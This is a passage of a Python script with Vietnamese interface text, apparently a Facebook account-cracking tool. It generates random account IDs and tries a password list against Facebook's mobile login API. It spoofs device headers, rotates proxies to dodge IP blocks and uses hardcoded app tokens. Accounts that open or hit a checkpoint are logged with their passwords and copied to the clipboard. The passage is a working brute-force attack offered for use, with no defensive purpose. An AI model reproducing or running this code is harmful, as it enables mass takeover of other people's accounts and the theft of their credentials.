    print(f"\n{G}[✓] Hoàn thành! Thành công: {Y}{len(oks)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_Tree():
    global oks, cps, loop, running
    running = True
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack series 2009-2010{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    try:
        limit = int(input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}"))
    except ValueError:
        print(f"   {rad}[!] Vui lòng nhập số hợp lệ!")
        time.sleep(2)
        old_Tree()
        return
    linex()

    user = []
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append('1000004' + suffix)

    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    if meth in ('1', 'A'):
        meth = 'A'
    elif meth in ('2', 'B'):
        meth = 'B'
    elif meth in ('3', 'C'):
        meth = 'C'

    print(f"\n{CYAN}[~] Đang chuẩn bị proxy...{RESET}")
    try:
        init_proxy_pool()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Đã dừng lấy proxy, tiếp tục không dùng proxy.{RESET}")
        running = False
    if not proxy_pool:
        print(f"{YELLOW}[!] Không có proxy, vẫn chạy nhưng dễ bị chặn IP.{RESET}")
    else:
        print(f"{G}[✓] Đã có {len(proxy_pool)} proxy sẵn sàng.{RESET}")
    time.sleep(1)

    oks = []
    cps = []
    loop = 0

    with tred(max_workers=SCAN_WORKERS) as pool:
        ____banner____()
        print(f"{G}[+] Tổng ID: {Y}{limit}{W}")
        print(f"{G}[+] Series: {Y}1000004xxxx{W}")
        print(f"{G}[+] Workers: {Y}{SCAN_WORKERS} luồng{W}")
        print(f"{G}[+] Proxy pool: {Y}{len(proxy_pool)}{W}")
        linex()
        try:
            for uid in user:
                if not running:
                    break
                if meth == 'A':
                    pool.submit(login_1, uid)
                elif meth == 'B':
                    pool.submit(login_2, uid)
                elif meth == 'C':
                    pool.submit(login_combined, uid)
            pool.shutdown(wait=True)
        except KeyboardInterrupt:
            running = False
            print(f"\n{YELLOW}[!] Đã nhận tín hiệu dừng, đang hủy các tác vụ crack...{RESET}")
            pool.shutdown(wait=False)

    save_scan_file()
    print(f"\n{G}[✓] Hoàn thành! Thành công: {Y}{len(oks)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session

def login_1(uid):
    global loop, oks, cps, running
    if not running:
        return
    sys.stdout.write(f"\r{CYAN}[DinhCongPhu-M1] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
    sys.stdout.flush()

    session = get_session()
    for pw in PASSWORDS:
        if not running:
            return
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': str(uid),
            'password': str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        headers = {
            'User-Agent': window1(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(rr(20000, 40000)),
            'X-FB-SIM-HNI': str(rr(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
        }

        resp = safe_request_with_proxy('POST', 'https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False)
        if resp is None:
            continue

        try:
            res = resp.json()
            if 'session_key' in res:
                text = f"{uid}|{pw}"
                copy_to_clipboard(text)
                print(f"\r{G}[DinhCongPhu-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                oks.append((uid, pw, creationyear(uid)))
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{Y}[DinhCongPhu-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                cps.append((uid, pw, creationyear(uid)))
                break
        except:
            continue
    loop += 1

def login_2(uid):
    global loop, oks, cps, running
    if not running:
        return
    sys.stdout.write(f"\r{CYAN}[DinhCongPhu-M2] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
    sys.stdout.flush()

    session = get_session()
    for pw in PASSWORDS:
        if not running:
            return
        headers = {
            'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
            'x-fb-sim-hni': str(rr(20000, 40000)),
            'x-fb-net-hni': str(rr(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': window1(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger'
        }
        url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"

        resp = safe_request_with_proxy('GET', url, headers=headers)
        if resp is None:
            continue

        try:
            po = resp.json()
            if 'session_key' in str(po) or 'session_key' in po:
                text = f"{uid}|{pw}"
                copy_to_clipboard(text)
                print(f"\r{G}[DinhCongPhu-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                oks.append((uid, pw, creationyear(uid)))
                break
            elif 'www.facebook.com' in str(po):
                print(f"\r{Y}[DinhCongPhu-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                cps.append((uid, pw, creationyear(uid)))
                break
        except:
            continue
    loop += 1

def login_combined(uid):
    global loop, oks, cps, running
    if not running:
        return
    sys.stdout.write(f"\r{PURPLE}[DinhCongPhu-COMBO] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
    sys.stdout.flush()

    session = get_session()
    for pw in PASSWORDS:
        if not running:
            return
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': str(uid),
            'password': str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'locale': 'en_US',
            'method': 'auth.login',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        headers = {'User-Agent': window1()}

        resp = safe_request_with_proxy('POST', 'https://b-graph.facebook.com/auth/login', data=data, headers=headers)
        if resp is None:
            continue

        try:
            res = resp.json()
            if 'session_key' in res:
                text = f"{uid}|{pw}"
                copy_to_clipboard(text)
                print(f"\r{G}[DinhCongPhu-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                oks.append((uid, pw, creationyear(uid)))
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{Y}[DinhCongPhu-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                cps.append((uid, pw, creationyear(uid)))
                break
        except:
            continue
    loop += 1

if __name__ == '__main__':
    try:
        ____banner____()
        animate_text("╔═══════════════════════════════════════════╗", CYAN, 0.01)
        animate_text("║   CHÀO MỪNG ĐẾN VỚI Tool Scan Via Của Phú Dz ║", PURPLE, 0.01)
        animate_text("╚═══════════════════════════════════════════╝", CYAN, 0.01)
        time.sleep(1)
        check_key()
        BNG_71_()
    except KeyboardInterrupt:
        print("\n\n[!] Đã ngắt tool thành công.")
        save_scan_file()
        os._exit(0)
